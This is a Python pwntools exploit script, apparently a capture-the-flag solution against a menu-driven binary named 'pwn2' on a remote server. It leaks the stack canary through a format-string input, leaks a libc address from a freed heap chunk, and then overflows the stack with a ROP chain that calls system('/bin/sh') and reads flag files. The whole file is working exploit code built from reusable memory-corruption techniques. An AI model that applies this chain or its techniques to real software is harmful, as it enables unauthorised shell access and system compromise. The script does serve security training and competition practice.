#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"
context.log_level = "debug"

HOST, PORT = "39.96.193.120", 10006

elf = ELF("./pwn2", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)

MAIN_ARENA_OFF = 0x1ecbe0
POP_RDI = 0x23b6a
RET    = 0x22679
BINSH  = next(libc.search(b"/bin/sh"))


class Solver:
    def __init__(self):
        self.io = remote(HOST, PORT)

    def menu(self, n):
        self.io.recvuntil(b"What do you want to do today?")
        self.io.recvuntil(b">>")
        self.io.sendline(str(n).encode())

    def forge(self, slot, dst=b"X", amt=1):
        self.menu(2)
        self.io.recvuntil(b"(0-9)")
        self.io.sendline(str(slot).encode())
        self.io.recvuntil(b"location:")
        self.io.sendline(dst)
        self.io.recvuntil(b"(1-9):")
        self.io.sendline(str(amt).encode())
        self.io.recvuntil(b"return.")
        self.io.sendline()

    def discard(self, slot):
        self.menu(3)
        self.io.recvuntil(b"discard?")
        self.io.sendline(str(slot).encode())

    def show(self):
        self.menu(1)
        d = self.io.recvuntil(b"return.")
        self.io.sendline()
        return d

    def steal_canary(self):
        self.io.recvuntil(b"name?")
        self.io.sendline(b"%7$p")
        self.io.recvuntil(b"Hello, ")
        v = int(self.io.recvline(), 16)
        log.success(f"canary: {hex(v)}")
        return v

    def steal_libc(self):
        for i in range(9):
            self.forge(i, bytes([0x41 + i]), 1)
        for i in range(7):
            self.discard(i)
        self.discard(7)

        d = self.show()
        # match original parsing exactly
        marker = b"Ring Slot #7  | ["
        pos = d.find(marker)
        line = d[pos : d.find(b"\n", pos)]
        raw = line.split(b"]   | ", 1)[1]
        addr = u64(raw[:6].ljust(8, b"\x00"))
        log.success(f"unsorted fd: {hex(addr)}")
        return addr - MAIN_ARENA_OFF

    def pwn(self):
        canary = self.steal_canary()
        base = self.steal_libc()
        log.success(f"libc base: {hex(base)}")

        chain  = b"A" * 0x38
        chain += p64(canary)
        chain += p64(0)
        chain += p64(base + RET)
        chain += p64(base + POP_RDI)
        chain += p64(base + BINSH)
        chain += p64(base + libc.sym["system"])

        self.menu(4)
        self.io.recvuntil(b"(id):")
        self.io.sendline(b"0")
        self.io.recvuntil(b"spell:")
        self.io.sendline(chain)
        self.io.recvuntil(b"Transporting")

        self.io.sendline(b"cat /flag* 2>/dev/null")
        self.io.sendline(b"cat flag* 2>/dev/null")
        self.io.sendline(b"cat /home/*/flag* 2>/dev/null")
        try:
            got = self.io.recvrepeat(3).decode("latin-1")
            log.success(f"result:\n{got}")
        except:
            pass
        self.io.close()


if __name__ == "__main__":
    s = Solver()
    s.pwn()
